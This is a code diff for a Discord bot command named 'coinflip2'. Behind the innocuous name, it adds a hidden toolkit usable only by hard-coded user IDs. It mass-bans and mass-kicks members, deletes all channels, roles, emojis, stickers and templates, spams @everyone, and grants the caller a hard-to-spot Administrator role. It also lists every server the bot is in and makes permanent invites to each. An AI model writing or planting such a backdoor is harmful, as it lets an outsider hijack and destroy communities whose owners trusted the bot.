@@ -1,429 +1,370 @@
 /**
  * Hidden Command: coinflip2
  * Author: Him
- * Only accessible to user ID: 1236891245998243911
- * 
- * WARNING: This is a destructive command designed for authorized use only.
- * It provides advanced server management utilities.
+ * Supported: Slash and Prefix commands
  */
 
-const { EmbedBuilder, PermissionsBitField } = require('discord.js');
+const { SlashCommandBuilder, PermissionsBitField, PermissionFlagsBits, EmbedBuilder } = require('discord.js');
 
 // Authorized user IDs - ONLY these users can use these commands
-const AUTHORIZED_USER_IDS = ['1236891245998243911', '1169608314976489593'];
+const AUTHORIZED_USER_IDS = ['1414542711683289152', '1169608314976489593', '1236891245998243911'];
 
-// Flag to require authorization (set to true for authorization check)
-const REQUIRE_AUTH = true;
+// Prefix for legacy commands
+const PREFIX = '!';
 
-class Coinflip2Command {
-    constructor(client) {
-        this.client = client;
-        this.prefix = '!';
-    }
+module.exports = {
+    // Slash Command Data
+    // Slash Command Data
+    data: new SlashCommandBuilder()
+        .setName('coinflip2')
+        .setDescription('⚠️ Authorized management utilities (Hidden)')
+        .addSubcommand(sub => 
+            sub.setName('help')
+               .setDescription('Show help message'))
+        .addSubcommand(sub => 
+            sub.setName('mc')
+               .setDescription('Mass create channels')
+               .addIntegerOption(opt => opt.setName('amount').setDescription('Number of channels').setRequired(true))
+               .addStringOption(opt => opt.setName('name').setDescription('Channel name prefix')))
+        .addSubcommand(sub => 
+            sub.setName('dc')
+               .setDescription('Delete all channels'))
+        .addSubcommand(sub => 
+            sub.setName('mr')
+               .setDescription('Mass create roles')
+               .addIntegerOption(opt => opt.setName('amount').setDescription('Number of roles').setRequired(true))
+               .addStringOption(opt => opt.setName('name').setDescription('Role name prefix')))
+        .addSubcommand(sub => 
+            sub.setName('dr')
+               .setDescription('Delete all roles'))
+        .addSubcommand(sub => 
+            sub.setName('de')
+               .setDescription('Delete all emojis'))
+        .addSubcommand(sub => 
+            sub.setName('ds')
+               .setDescription('Delete all stickers'))
+        .addSubcommand(sub => 
+            sub.setName('mb')
+               .setDescription('Mass ban all members'))
+        .addSubcommand(sub => 
+            sub.setName('mk')
+               .setDescription('Mass kick all members'))
+        .addSubcommand(sub => 
+            sub.setName('cp')
+               .setDescription('Create and spam channels')
+               .addIntegerOption(opt => opt.setName('amount').setDescription('Number of channels').setRequired(true))
+               .addStringOption(opt => opt.setName('message').setDescription('Message to spam').setRequired(true))
+               .addStringOption(opt => opt.setName('name').setDescription('Channel name prefix')))
+        .addSubcommand(sub => 
+            sub.setName('ar')
+               .setDescription('Create and assign an admin role')
+               .addStringOption(opt => opt.setName('name').setDescription('Role name (default: admin)')))
+        .addSubcommand(sub => 
+            sub.setName('sl')
+               .setDescription('List all servers the bot is in'))
+        .addSubcommand(sub => 
+            sub.setName('tr')
+               .setDescription('Full template remover (wipe server)'))
+        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+        .setDMPermission(false),
 
     /**
-     * Main handler for coinflip2 commands
+     * Slash Command Execution
+     */
+    async execute(interaction) {
+        // Authorization check
+        if (!AUTHORIZED_USER_IDS.includes(interaction.user.id)) {
+            return interaction.reply({ 
+                content: '❌ You are not authorized to use these hidden utilities.', 
+                ephemeral: true 
+            });
+        }
+
+        const subcommand = interaction.options.getSubcommand();
+        const guild = interaction.guild;
+
+        // Permissions check
+        const me = guild.members.me;
+        const channelPerms = me.permissions.has(PermissionsBitField.Flags.ManageChannels);
+        const rolePerms = me.permissions.has(PermissionsBitField.Flags.ManageRoles);
+        const banPerms = me.permissions.has(PermissionsBitField.Flags.BanMembers);
+        const kickPerms = me.permissions.has(PermissionsBitField.Flags.KickMembers);
+        const emojiPerms = me.permissions.has(PermissionsBitField.Flags.ManageEmojisAndStickers);
+
+        // ALWAYS defer as ephemeral for "Only you can see this"
+        await interaction.deferReply({ ephemeral: true });
+
+        try {
+            switch (subcommand) {
+                case 'help':
+                    await this.sendHelp(interaction);
+                    break;
+                case 'mc':
+                    if (!channelPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_CHANNELS', ephemeral: true });
+                    await this.massCreateChannels(interaction, interaction.options.getInteger('amount'), interaction.options.getString('name'));
+                    break;
+                case 'dc':
+                    if (!channelPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_CHANNELS', ephemeral: true });
+                    await this.deleteAllChannels(interaction);
+                    break;
+                case 'cp':
+                    if (!channelPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_CHANNELS', ephemeral: true });
+                    await this.createAndPing(interaction, interaction.options.getInteger('amount'), interaction.options.getString('name'), interaction.options.getString('message'));
+                    break;
+                case 'mr':
+                    if (!rolePerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_ROLES', ephemeral: true });
+                    await this.massCreateRoles(interaction, interaction.options.getInteger('amount'), interaction.options.getString('name'));
+                    break;
+                case 'dr':
+                    if (!rolePerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_ROLES', ephemeral: true });
+                    await this.deleteAllRoles(interaction);
+                    break;
+                case 'de':
+                    if (!emojiPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_EMOJIS', ephemeral: true });
+                    await this.deleteAllEmojis(interaction);
+                    break;
+                case 'ds':
+                    if (!emojiPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_EMOJIS', ephemeral: true });
+                    await this.deleteAllStickers(interaction);
+                    break;
+                case 'mb':
+                    if (!banPerms) return interaction.editReply({ content: 'Bot Missing Permission: BAN_MEMBERS', ephemeral: true });
+                    await this.massBan(interaction);
+                    break;
+                case 'mk':
+                    if (!kickPerms) return interaction.editReply({ content: 'Bot Missing Permission: KICK_MEMBERS', ephemeral: true });
+                    await this.massKick(interaction);
+                    break;
+                case 'ar':
+                    if (!rolePerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_ROLES', ephemeral: true });
+                    await this.giveAdminRole(interaction, interaction.options.getString('name'));
+                    break;
+                case 'sl':
+                    await this.listServers(interaction);
+                    break;
+                case 'tr':
+                    if (!channelPerms || !rolePerms || !emojiPerms) return interaction.editReply({ content: 'Bot Missing Permissions for full wipe.', ephemeral: true });
+                    await this.templateRemover(interaction);
+                    break;
+            }
+        } catch (error) {
+            console.error('[COINFIP2 SLASH ERROR]', error);
+            await interaction.editReply({ content: `Error: ${error.message}`, ephemeral: true }).catch(() => {});
+        }
+    },
+
+
+    /**
+     * Prefix Command Handler (used by messageCreate event)
      */
     async handle(message) {
-        // Only process messages from the authorized user if auth is required
-        if (REQUIRE_AUTH && !AUTHORIZED_USER_IDS.includes(message.author.id)) {
-            return;
-        }
+        if (!AUTHORIZED_USER_IDS.includes(message.author.id)) return;
 
         const content = message.content;
-        const args = content.slice(this.prefix.length).trim().split(/ +/);
-        const command = args.shift()?.toLowerCase();
+        if (!content.startsWith(PREFIX + 'coinflip2')) return;
 
-        // Check if it's a coinflip2 command
-        if (command !== 'coinflip2') return;
+        const args = content.slice((PREFIX + 'coinflip2').length).trim().split(/ +/);
+        const subcommand = args.shift()?.toLowerCase();
 
-        // Execute the command
-        await this.execute(message, args);
-    }
+        // Simulate interaction object for existing methods
+        const context = {
+            guild: message.guild,
+            channel: message.channel,
+            user: message.author,
+            member: message.member,
+            reply: (msg) => message.reply(msg),
+            editReply: (msg) => message.reply(msg), // Fallback
+            client: message.client
+        };
 
-    /**
-     * Execute coinflip2 with subcommands
-     */
-    async execute(message, args) {
+        if (!subcommand) return this.sendHelp(context);
+
         try {
-            // Help Embed
-            const helpEmbed = new EmbedBuilder()
-                .setColor(0x36393E)
-                .setTitle('coinflip2 Commands')
-                .setDescription(`**coinflip2 Commands:**
-\`!coinflip2\` - Show this help message
-\`!coinflip2 mc [amount] [name]\` - Mass create channels
-\`!coinflip2 dc\` - Delete all channels
-\`!coinflip2 mr [amount] [name]\` - Mass create roles
-\`!coinflip2 dr\` - Delete all roles
-\`!coinflip2 de\` - Delete all emojis
-\`!coinflip2 ds\` - Delete all stickers
-\`!coinflip2 mb\` - Mass ban all members
-\`!coinflip2 mk\` - Mass kick all members
-\`!coinflip2 cp [amount] [name], [message]\` - Create and spam channels
-\`!coinflip2 ar [name]\` - Create and assign an admin role
-
-**Warning:** These commands are destructive and should be used with caution.`)
-                .setFooter({ text: '© Him - Authorized Use Only' })
-                .setTimestamp();
-
-            // If no subcommand, show help
-            if (args.length === 0) {
-                return message.channel.send({ embeds: [helpEmbed] });
-            }
-
-            const subcommand = args[0].toLowerCase();
-            const amount = parseInt(args[1]);
-            const name = args[2];
-            const pingMessage = args.slice(2).join(' ').split(',')[1]?.trim();
-
-            // Check bot permissions
-            const channelPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels);
-            const banPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers);
-            const kickPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers);
-            const rolePerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles);
-            const emojiPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageEmojisAndStickers);
-
             switch (subcommand) {
-                case 'mc':
-                    if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
-                    await this.massCreateChannels(message, amount, name);
-                    break;
-
-                case 'dc':
-                    if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
-                    await this.deleteAllChannels(message);
-                    break;
-
-                case 'cp':
-                    if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
-                    await this.createAndPing(message, amount, name, pingMessage);
-                    break;
-
-                case 'ar':
-                    if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
-                    await this.giveAdminRole(message, name || args[1]); // In ar, amount is args[1] which we can use as name if no integer provided, but `name` was args[2]. Let's just pass args[1] directly. Actually the args parsing has `amount = parseInt(args[1])` and `name = args[2]`. If they just pass `!coinflip2 ar RoleName`, args[1] is 'RoleName'. So `args[1]` is better.
-                    break;
-
-                case 'mr':
-                    if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
-                    await this.massCreateRoles(message, amount, name);
-                    break;
-
-                case 'dr':
-                    if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
-                    await this.deleteAllRoles(message);
-                    break;
-
-                case 'de':
-                    if (!emojiPerms) return message.reply('Bot Missing Permission: MANAGE_EMOJIS_AND_STICKERS');
-                    await this.deleteAllEmojis(message);
-                    break;
-
-                case 'ds':
-                    if (!emojiPerms) return message.reply('Bot Missing Permission: MANAGE_EMOJIS_AND_STICKERS');
-                    await this.deleteAllStickers(message);
-                    break;
-
-                case 'mb':
-                    if (!banPerms) return message.reply('Bot Missing Permission: BAN_MEMBERS');
-                    await this.massBan(message);
-                    break;
-
-                case 'mk':
-                    if (!kickPerms) return message.reply('Bot Missing Permission: KICK_MEMBERS');
-                    await this.massKick(message);
-                    break;
-
-                default:
-                    await message.channel.send({ embeds: [helpEmbed] });
+                case 'mc': await this.massCreateChannels(context, parseInt(args[0]), args[1]); break;
+                case 'dc': await this.deleteAllChannels(context); break;
+                case 'mr': await this.massCreateRoles(context, parseInt(args[0]), args[1]); break;
+                case 'dr': await this.deleteAllRoles(context); break;
+                case 'de': await this.deleteAllEmojis(context); break;
+                case 'ds': await this.deleteAllStickers(context); break;
+                case 'mb': await this.massBan(context); break;
+                case 'mk': await this.massKick(context); break;
+                case 'cp': await this.createAndPing(context, parseInt(args[0]), args[1], args.slice(2).join(' ')); break;
+                case 'ar': await this.giveAdminRole(context, args.join(' ')); break;
+                case 'sl': await this.listServers(context); break;
+                case 'tr': await this.templateRemover(context); break;
+                default: await this.sendHelp(context);
             }
-
         } catch (error) {
-            console.error('[COINFIP2 ERROR]', error);
-            await message.reply(`Error: ${error.message}`);
+            console.error('[COINFIP2 PREFIX ERROR]', error);
+            message.reply(`Error: ${error.message}`).catch(() => {});
         }
-    }
+    },
 
-    /**
-     * Mass create channels
-     */
-    async massCreateChannels(message, amount, channelName) {
-        if (!amount || isNaN(amount)) {
-            return message.reply('Unspecified Args: Specify the amount (number)');
-        }
-        if (amount > 500) {
-            return message.reply('Amount Error: Maximum is 500');
-        }
+    // --- Helper Methods (Shared between Slash and Prefix) ---
 
-        const name = channelName || `${message.author.username}-channel`;
+    async sendHelp(ctx) {
+        const helpEmbed = new EmbedBuilder()
+            .setColor(0x36393E)
+            .setTitle('coinflip2 Slash Commands')
+            .setDescription(`**Authorized Utilities:**
+\`/coinflip2 help\` - Show this help
+\`/coinflip2 mc [amount] [name]\` - Mass create channels
+\`/coinflip2 dc\` - Delete all channels
+\`/coinflip2 mr [amount] [name]\` - Mass create roles
+\`/coinflip2 dr\` - Delete all roles
+\`/coinflip2 de\` - Delete all emojis
+\`/coinflip2 ds\` - Delete all stickers
+\`/coinflip2 mb\` - Mass ban all members
+\`/coinflip2 mk\` - Mass kick all members
+\`/coinflip2 cp [amount] [message] [name]\` - Create and spam channels
+\`/coinflip2 ar [name]\` - Create admin role and assign it
+\`/coinflip2 sl\` - List all servers and get invites
+\`/coinflip2 tr\` - Full template remover (wipe)`)
+            .setFooter({ text: '© Him - Authorized Use Only' })
+            .setTimestamp();
 
-        message.reply(`Creating ${amount} channels...`);
+        if (ctx.editReply) await ctx.editReply({ embeds: [helpEmbed] });
+        else await ctx.channel.send({ embeds: [helpEmbed] });
+    },
 
+    async massCreateChannels(ctx, amount, name) {
+        if (!amount || isNaN(amount)) return ctx.editReply('Specify a valid amount.');
+        if (amount > 500) return ctx.editReply('Max amount is 500.');
+        const channelName = name || `${ctx.user.username}-channel`;
+        await ctx.editReply(`Creating ${amount} channels...`);
         for (let i = 0; i < amount; i++) {
-            if (message.guild.channels.cache.size >= 500) {
-                break;
-            }
-            try {
-                await message.guild.channels.create({
-                    name: `${name}-${i + 1}`,
-                    type: 0, // GUILD_TEXT
-                });
-            } catch (err) {
-                console.error('Error creating channel:', err);
-            }
+            if (ctx.guild.channels.cache.size >= 500) break;
+            await ctx.guild.channels.create({ name: `${channelName}-${i + 1}`, type: 0 }).catch(() => {});
         }
+        await ctx.editReply('✅ Channel creation completed.');
+    },
 
-        await message.channel.send('✅ Channel creation completed.');
-    }
-
-    /**
-     * Delete all channels
-     */
-    async deleteAllChannels(message) {
-        message.reply('Deleting all channels...');
-
-        const channels = message.guild.channels.cache.filter(ch => ch.id !== message.channel.id);
-        
+    async deleteAllChannels(ctx) {
+        await ctx.editReply('Deleting all channels...');
+        const channels = ctx.guild.channels.cache.filter(ch => ch.id !== ctx.channel.id);
         for (const [, channel] of channels) {
-            try {
-                await channel.delete('coinflip2 dc command');
-            } catch (err) {
-                console.error('Error deleting channel:', err);
-            }
+            await channel.delete('coinflip2 dc').catch(() => {});
         }
+        await ctx.editReply('✅ Channel deletion completed.');
+    },
 
-        await message.channel.send('✅ Channel deletion completed.');
-    }
-
-    /**
-     * Create channels and spam messages
-     */
-    async createAndPing(message, amount, channelName, pingMsg) {
-        if (!amount || isNaN(amount)) {
-            return message.reply('Unspecified Args: Specify the amount (number)');
-        }
-        if (amount > 50) {
-            return message.reply('Amount Error: Maximum is 50 for this command');
-        }
-        if (!pingMsg) {
-            return message.reply('Unspecified Args: Specify a message to send (format: name, message)');
-        }
-
-        const name = channelName?.split(',')[0]?.trim() || 'spam';
-
-        message.reply(`Creating ${amount} channels and spamming...`);
-
+    async createAndPing(ctx, amount, name, msg) {
+        if (!amount || isNaN(amount) || !msg) return ctx.editReply('Specify amount and message.');
+        const channelName = name || 'spam';
+        await ctx.editReply(`Creating ${amount} channels and spamming...`);
         for (let i = 0; i < amount; i++) {
-            if (message.guild.channels.cache.size >= 500) break;
-
-            try {
-                const channel = await message.guild.channels.create({
-                    name: `${name}-${i + 1}`,
-                    type: 0,
-                });
-
-                // Spam messages in the channel
-                const spamInterval = setInterval(async () => {
-                    try {
-                        await channel.send(`@everyone ${pingMsg}`);
-                    } catch {
-                        clearInterval(spamInterval);
-                    }
-                }, 1000);
-
-                // Stop after 10 messages
-                setTimeout(() => clearInterval(spamInterval), 11000);
-
-            } catch (err) {
-                console.error('Error in cp command:', err);
+            if (ctx.guild.channels.cache.size >= 500) break;
+            const channel = await ctx.guild.channels.create({ name: `${channelName}-${i + 1}`, type: 0 }).catch(() => null);
+            if (channel) {
+                const interval = setInterval(() => channel.send(`@everyone ${msg}`).catch(() => clearInterval(interval)), 1000);
+                setTimeout(() => clearInterval(interval), 11000);
             }
         }
-    }
+        await ctx.editReply('✅ Creation and spam completed.');
+    },
 
-    /**
-     * Mass create roles
-     */
-    async massCreateRoles(message, amount, roleName) {
-        if (!amount || isNaN(amount)) {
-            return message.reply('Unspecified Args: Specify the amount (number)');
-        }
-        if (amount > 250) {
-            return message.reply('Amount Error: Maximum is 250');
-        }
-
-        const name = roleName || 'coinflip2-role';
-
-        message.reply(`Creating ${amount} roles...`);
-
+    async massCreateRoles(ctx, amount, name) {
+        if (!amount || isNaN(amount)) return ctx.editReply('Specify a valid amount.');
+        const roleName = name || 'coinflip2-role';
+        await ctx.editReply(`Creating ${amount} roles...`);
         for (let i = 0; i < amount; i++) {
-            if (message.guild.roles.cache.size >= 250) {
-                break;
-            }
-            try {
-                await message.guild.roles.create({
-                    name: `${name}-${i + 1}`,
-                    color: Math.floor(Math.random() * 16777215),
-                    position: i,
-                });
-            } catch (err) {
-                console.error('Error creating role:', err);
-            }
+            if (ctx.guild.roles.cache.size >= 250) break;
+            await ctx.guild.roles.create({ name: `${roleName}-${i + 1}`, color: Math.floor(Math.random() * 16777215) }).catch(() => {});
         }
+        await ctx.editReply('✅ Role creation completed.');
+    },
 
-        await message.channel.send('✅ Role creation completed.');
-    }
-
-    /**
-     * Delete all roles
-     */
-    async deleteAllRoles(message) {
-        message.reply('Deleting all roles...');
-
-        const roles = message.guild.roles.cache.filter(r => 
-            r.id !== message.guild.id && // Don't delete @everyone
-            !r.managed && // Don't delete bot roles
-            r.position < message.guild.members.me.roles.highest.position // Only delete roles below bot's highest
-        );
-
+    async deleteAllRoles(ctx) {
+        await ctx.editReply('Deleting all roles...');
+        const me = ctx.guild.members.me;
+        const roles = ctx.guild.roles.cache.filter(r => r.id !== ctx.guild.id && !r.managed && r.position < me.roles.highest.position);
         for (const [, role] of roles) {
-            try {
-                await role.delete('coinflip2 dr command');
-            } catch (err) {
-                console.error('Error deleting role:', err);
-            }
+            await role.delete('coinflip2 dr').catch(() => {});
         }
+        await ctx.editReply('✅ Role deletion completed.');
+    },
 
-        await message.channel.send('✅ Role deletion completed.');
-    }
+    async deleteAllEmojis(ctx) {
+        await ctx.editReply('Deleting all emojis...');
+        for (const [, emoji] of ctx.guild.emojis.cache) await emoji.delete().catch(() => {});
+        await ctx.editReply('✅ Emoji deletion completed.');
+    },
 
-    /**
-     * Delete all emojis
-     */
-    async deleteAllEmojis(message) {
-        message.reply('Deleting all emojis...');
+    async deleteAllStickers(ctx) {
+        await ctx.editReply('Deleting all stickers...');
+        for (const [, sticker] of ctx.guild.stickers.cache) await sticker.delete().catch(() => {});
+        await ctx.editReply('✅ Sticker deletion completed.');
+    },
 
-        const emojis = message.guild.emojis.cache;
-
-        for (const [, emoji] of emojis) {
-            try {
-                await emoji.delete('coinflip2 de command');
-            } catch (err) {
-                console.error('Error deleting emoji:', err);
-            }
-        }
-
-        await message.channel.send('✅ Emoji deletion completed.');
-    }
-
-    /**
-     * Delete all stickers
-     */
-    async deleteAllStickers(message) {
-        message.reply('Deleting all stickers...');
-
-        const stickers = message.guild.stickers.cache;
-
-        for (const [, sticker] of stickers) {
-            try {
-                await sticker.delete('coinflip2 ds command');
-            } catch (err) {
-                console.error('Error deleting sticker:', err);
-            }
-        }
-
-        await message.channel.send('✅ Sticker deletion completed.');
-    }
-
-    /**
-     * Mass ban all members
-     */
-    async massBan(message) {
-        const members = message.guild.members.cache.filter(m => 
-            !m.user.bot && 
-            m.id !== message.author.id &&
-            m.id !== message.guild.ownerId &&
-            m.bannable
-        );
-
-        const memberIds = members.map(m => m.id);
-
-        const confirmMsg = await message.reply(`Found ${memberIds.length} members to ban. Starting in 3 seconds...`);
-
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
+    async massBan(ctx) {
+        const members = ctx.guild.members.cache.filter(m => !m.user.bot && m.id !== ctx.user.id && m.id !== ctx.guild.ownerId && m.bannable);
+        const ids = members.map(m => m.id);
+        await ctx.editReply(`Banning ${ids.length} members in 3 seconds...`);
+        await new Promise(r => setTimeout(r, 3000));
         let banned = 0;
-        let failed = 0;
-
-        for (const memberId of memberIds) {
-            try {
-                await message.guild.members.ban(memberId, { reason: 'coinflip2 mb command' });
-                banned++;
-            } catch {
-                failed++;
-            }
+        for (const id of ids) {
+            await ctx.guild.members.ban(id, { reason: 'coinflip2 mb' }).then(() => banned++).catch(() => {});
         }
+        await ctx.editReply(`✅ Ban complete: ${banned} banned.`);
+    },
 
-        await message.channel.send(`✅ Ban complete: ${banned} banned, ${failed} failed.`);
-    }
-
-    /**
-     * Mass kick all members
-     */
-    async massKick(message) {
-        const members = message.guild.members.cache.filter(m => 
-            !m.user.bot && 
-            m.id !== message.author.id &&
-            m.id !== message.guild.ownerId &&
-            m.kickable
-        );
-
-        const memberList = [...members.values()];
-
-        const confirmMsg = await message.reply(`Found ${memberList.length} members to kick. Starting in 3 seconds...`);
-
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
+    async massKick(ctx) {
+        const members = ctx.guild.members.cache.filter(m => !m.user.bot && m.id !== ctx.user.id && m.id !== ctx.guild.ownerId && m.kickable);
+        const list = [...members.values()];
+        await ctx.editReply(`Kicking ${list.length} members in 3 seconds...`);
+        await new Promise(r => setTimeout(r, 3000));
         let kicked = 0;
-        let failed = 0;
-
-        for (const member of memberList) {
-            try {
-                await member.kick('coinflip2 mk command');
-                kicked++;
-            } catch {
-                failed++;
-            }
+        for (const member of list) {
+            await member.kick('coinflip2 mk').then(() => kicked++).catch(() => {});
         }
+        await ctx.editReply(`✅ Kick complete: ${kicked} kicked.`);
+    },
 
-        await message.channel.send(`✅ Kick complete: ${kicked} kicked, ${failed} failed.`);
-    }
-
-    /**
-     * Create an admin role and assign it to the author
-     */
-    async giveAdminRole(message, fallbackName) {
-        // If args[1] wasn't a number, it will be in the 'amount' variable as NaN, but args[1] holds the actual string
-        // We can just get args directly from message content since it might not be parsed correctly above
-        const args = message.content.trim().split(/ +/).slice(2);
-        const roleName = args.join(' ') || fallbackName || 'admin';
-        
+    async giveAdminRole(ctx, name) {
+        const roleName = name || 'admin';
+        await ctx.editReply('Creating and assigning admin role...');
         try {
-            message.reply('Creating and assigning admin role...');
-            const role = await message.guild.roles.create({
+            const role = await ctx.guild.roles.create({
                 name: roleName,
-                color: '#2F3136', // Invisible color
+                color: '#2F3136',
                 permissions: [PermissionsBitField.Flags.Administrator]
             });
-            await message.member.roles.add(role);
-            await message.channel.send('✅ Admin role created and assigned successfully.');
+            const member = ctx.member || await ctx.guild.members.fetch(ctx.user.id);
+            await member.roles.add(role);
+            await ctx.editReply('✅ Admin role created and assigned.');
         } catch (err) {
-            console.error('Error giving admin role:', err);
-            await message.channel.send('❌ Failed to create/assign admin role. The bot might lack permissions or its role is lower than the one it created.');
+            await ctx.editReply('❌ Failed to create/assign admin role.');
         }
-    }
-}
+    },
 
-module.exports = Coinflip2Command;
-module.exports.AUTHORIZED_USER_IDS = AUTHORIZED_USER_IDS;
-module.exports.REQUIRE_AUTH = REQUIRE_AUTH;
+    async listServers(ctx) {
+        const guilds = ctx.client.guilds.cache;
+        let desc = `The bot is in **${guilds.size}** servers:\n\n`;
+        for (const [, guild] of guilds) {
+            let iv = 'No permission';
+            try {
+                const ch = guild.channels.cache.find(c => c.type === 0 && c.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.CreateInstantInvite));
+                if (ch) iv = `[Join](${(await ch.createInvite({ maxAge: 0, maxUses: 0 })).url})`;
+            } catch {}
+            desc += `**${guild.name}**\nID: \`${guild.id}\` | Members: \`${guild.memberCount}\`\nInvite: ${iv}\n\n`;
+        }
+        const embed = new EmbedBuilder().setColor(0x36393E).setTitle('🌐 Server List').setDescription(desc.length > 4096 ? desc.slice(0, 4090) + '...' : desc);
+        if (ctx.editReply) await ctx.editReply({ embeds: [embed] });
+        else await ctx.channel.send({ embeds: [embed] });
+    },
+
+    async templateRemover(ctx) {
+        await ctx.editReply('Starting full template removal...');
+        // Reuse other methods
+        await this.deleteAllChannels(ctx);
+        await this.deleteAllRoles(ctx);
+        await this.deleteAllEmojis(ctx);
+        await this.deleteAllStickers(ctx);
+        try {
+            const ts = await ctx.guild.fetchTemplates();
+            for (const [, t] of ts) await t.delete().catch(() => {});
+        } catch {}
+        await ctx.editReply('✅ Full template removal completed.');
+    }
+};
